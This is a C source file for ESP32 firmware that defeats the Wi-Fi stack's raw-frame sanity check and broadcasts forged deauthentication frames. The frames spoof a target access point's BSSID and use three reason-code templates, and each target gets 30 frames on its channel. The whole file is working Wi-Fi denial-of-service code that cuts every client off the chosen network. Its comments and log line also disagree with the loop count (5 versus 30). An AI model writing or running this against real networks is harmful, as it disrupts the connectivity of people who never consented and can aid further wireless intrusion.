/**
 * @file wsl_bypasser.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-05
 * @copyright Copyright (c) 2021
 *
 * @brief Implementation of Wi-Fi Stack Libaries bypasser.
 */
#include "wsl_bypasser.h"

#include <stdint.h>
#include <string.h>

#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"

static const char *TAG = "wsl_bypasser";

// Deauthentication frame com reason code 0x02 (INVALID_AUTHENTICATION)
static const uint8_t deauth_frame_invalid_auth[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (substituído)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (substituído)
    0xf0, 0xff, 0x02, 0x00 // Reason code: INVALID_AUTHENTICATION
};

// Deauthentication frame com reason code 0x04 (DISASSOCIATED_DUE_TO_INACTIVITY)
static const uint8_t deauth_frame_inactivity[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x04, 0x00
};

// Deauthentication frame com reason code 0x07 (CLASS3_FRAME_FROM_NONASSOC_STA)
static const uint8_t deauth_frame_class3[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x07, 0x00
};

// Função auxiliar para obter o template com base no tipo
static const uint8_t* get_deauth_frame_template(deauth_frame_type_t type) {
    switch (type) {
        case DEAUTH_INVALID_AUTH:
            return deauth_frame_invalid_auth;
        case DEAUTH_INACTIVITY:
            return deauth_frame_inactivity;
        case DEAUTH_CLASS3:
            return deauth_frame_class3;
        default:
            return deauth_frame_invalid_auth;
    }
}

/**
 * @brief Decompiled function that overrides original one at compilation time.
 *
 * @attention This function is not meant to be called!
 * @see Project with original idea/implementation https://github.com/GANESH-ICMC/esp32-deauther
 */
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
    ESP_LOGD(TAG, "Attempting to send raw frame of size %d", size);
    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to send raw frame: %s (0x%x)", esp_err_to_name(ret), ret);
    } else {
        ESP_LOGI(TAG, "Raw frame sent successfully");
    }
}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, deauth_frame_type_t type) {
    const char* type_str = (type == DEAUTH_INVALID_AUTH) ? "INVALID_AUTH" :
    (type == DEAUTH_INACTIVITY) ? "INACTIVITY" :
    "CLASS3";
    ESP_LOGD(TAG, "Preparing deauth frame (%s) to %s on channel %d", type_str, ap_record->ssid, ap_record->primary);
    ESP_LOGD(TAG, "BSSID: %02x:%02x:%02x:%02x:%02x:%02x",
             ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
             ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);

    const uint8_t *frame_template = get_deauth_frame_template(type);
    uint8_t deauth_frame[sizeof(deauth_frame_invalid_auth)];
    memcpy(deauth_frame, frame_template, sizeof(deauth_frame_invalid_auth));
    memcpy(&deauth_frame[10], ap_record->bssid, 6); // Source MAC
    memcpy(&deauth_frame[16], ap_record->bssid, 6); // BSSID

    ESP_LOGD(TAG, "Switching to channel %d", ap_record->primary);
    esp_err_t ret = esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE);
    if (ret != ESP_OK) {
        ESP_LOGE(TAG, "Failed to set channel %d: %s", ap_record->primary, esp_err_to_name(ret));
        return;
    }

    for (int i = 0; i < 30; i++) { // Envia 5 vezes
        ESP_LOGD(TAG, "Sending deauth frame %d/%d", i + 1, 5);
        wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_invalid_auth));
        vTaskDelay(100 / portTICK_PERIOD_MS); // Aguarda 100ms entre envios
    }
}
